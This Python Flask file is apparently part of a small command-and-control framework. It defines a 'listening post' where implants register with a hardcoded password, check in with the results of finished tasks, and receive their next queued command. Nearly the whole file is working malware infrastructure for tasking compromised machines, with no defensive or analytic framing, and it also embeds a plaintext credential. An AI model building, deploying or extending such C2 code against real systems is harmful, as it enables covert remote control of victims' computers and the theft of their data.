# this is a listenering post blueprint
from flask import Blueprint, request, jsonify, abort
from speedrun.db import db
from speedrun.models import make_foo, Foo, Task, TASK_STARTED, TASK_CREATED
from dataclasses import dataclass, asdict
import time
from speedrun.models import Session, SESSION_OK

lp = Blueprint("lp", __name__)

INFO = "linux"

PW = "we_<3_ghost"


@lp.route("/register", methods=["POST"])
def handle_session_register():
    json_data = request.json
    if json_data.get("password") != PW:
        print("hahaha nice try ", request)
        abort(404)

    print("A new session has tried to authenticate", json_data)
    now = int(time.time())
    s = Session(created_at=now, last_seen=now, status=SESSION_OK, os_info=INFO)

    db.session.add(s)
    db.session.commit()
    return jsonify({"status": True, "id": s.id})


@lp.route("/checkin/<id>", methods=["POST"])
def handle_session_checking(id: int):
    checkin_data = request.json
    if checkin_data:
        task_id = checkin_data.get("id")
        t = (
            db.session.query(Task)
            .filter(Task.id == task_id)
            .filter(Task.status == TASK_STARTED)
            .first()
        )
        if t is not None:
            print("Implant finished task: ", t)
            t.status = checkin_data["status"]
            t.result = checkin_data["result"]
            db.session.add(t)
            db.session.commit()

        print(checkin_data)
    print("id: ", id)
    t = (
        db.session.query(Task)
        .filter(Task.session_id == id)
        .filter(Task.status == TASK_CREATED)
        .first()
    )
    if t is None:
        return jsonify(None)
    t.status = TASK_STARTED
    db.session.add(t)
    db.session.commit()
    return jsonify(asdict(t))
